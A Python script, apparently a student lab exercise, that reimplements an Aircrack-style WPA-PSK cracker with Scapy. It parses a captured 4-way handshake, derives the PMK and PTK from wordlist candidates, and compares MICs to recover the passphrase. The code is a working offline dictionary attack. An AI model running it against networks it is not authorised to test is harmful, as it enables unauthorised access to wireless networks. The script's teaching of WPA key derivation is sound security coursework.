#!/usr/bin/env python
# -*- coding: utf-8 -*-

# Author : Quentin Le Ray, Ryan Sauge
# Date : 28.04.2022
# Description : Aircrack version Scapy

from binascii import a2b_hex, b2a_hex

from scapy.all import *
from scapy.layers.eap import EAPOL
from scapy.layers.dot11 import Dot11Beacon, Dot11ProbeResp
from pbkdf2 import *


# Repris du code fourni
def customPRF512(key, A, B):
    """
    This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
    """
    blen = 64
    i = 0
    R = b''
    while i <= ((blen * 8 + 159) / 160):
        hmacsha1 = hmac.new(key, A + str.encode(chr(0x00)) + B + str.encode(chr(i)), hashlib.sha1)
        i += 1
        R = R + hmacsha1.digest()
    return R[:blen]


# Read capture file -- it contains beacon, authentication, associacion, handshake and data
wpa = rdpcap("wpa_handshake.cap")

# Elements pour la dérivation des clés
A = "Pairwise key expansion"  # this string is used in the pseudo-random function
ssid = ""
APmac = ""
Clientmac = ""
ANonce = ""
SNonce = ""
mic_to_test = ""
cpt = 0

# Récupération des éléments depuis les trames Wireshark
for pkt in wpa:
    if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
        if pkt.type == 0 and pkt.subtype == 8:
            ssid = pkt.info.decode()
            APmac = a2b_hex(pkt.addr2.replace(":", ""))
    if pkt.type == 0 and pkt.subtype == 0xB and len(Clientmac) == 0:
        Clientmac = a2b_hex(pkt.addr1.replace(":", ""))

    if pkt.haslayer(EAPOL):
        if cpt == 0:
            ANonce = pkt[EAPOL].load[13:13 + 0x20]
        if cpt == 1:
            SNonce = pkt[EAPOL].load[13:13 + 0x20]
        if cpt == 3:
            # Récupération du mic du dernier message
            mic_to_test = pkt[EAPOL].load[77:77 + 16]
        cpt = cpt + 1

# Pour comparer le mic en version hexadécimale
mic_to_testDecoded = b2a_hex(mic_to_test).decode()

# used in pseudo-random function
B = min(APmac, Clientmac) + max(APmac, Clientmac) + min(ANonce, SNonce) + max(ANonce, SNonce)

# Récupération payload
last4Way = wpa[8]
last4WayData = bytes(last4Way[EAPOL])
# Effacement du mic dans la payload
toReplace = a2b_hex("00000000000000000000000000000000")
data = last4WayData.replace(mic_to_test, toReplace)

# read wordlist file and find good passphrase
with open('wordlist.txt') as f:
    find = False
    for passPhrase in f:
        # Suppression du charactère de fin de ligne
        passPhrase = passPhrase.rstrip()

        # Calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
        passPhraseEncoded = str.encode(passPhrase)
        ssidEncoded = str.encode(ssid)
        pmk = pbkdf2(hashlib.sha1, passPhraseEncoded, ssidEncoded, 4096, 32)

        # Expand pmk to obtain PTK
        ptk = customPRF512(pmk, str.encode(A), B)

        # Calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK
        mic = hmac.new(ptk[0:16], data, hashlib.sha1).hexdigest()[:-8]

        if mic == mic_to_testDecoded:
            print("Mot de passe trouvé :", passPhrase)
            find = True
            break

if not find:
    print("Passphrase non trouvée")
